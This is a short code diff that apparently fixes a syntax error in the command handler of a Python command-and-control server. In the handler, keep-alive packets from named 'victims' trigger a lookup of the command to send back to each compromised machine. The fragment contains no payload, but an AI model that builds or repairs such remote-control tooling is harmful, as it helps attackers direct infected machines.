@@ -51,9 +51,8 @@ def handle_load(load, path, sender_ip):
     else:
         print(f"\n[{datetime.now().strftime('%H:%M:%S')}]keep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
-        if(command) {
+        if(command):
             print(f"sent command: {command}")
-        }
         return command
 
     return ""
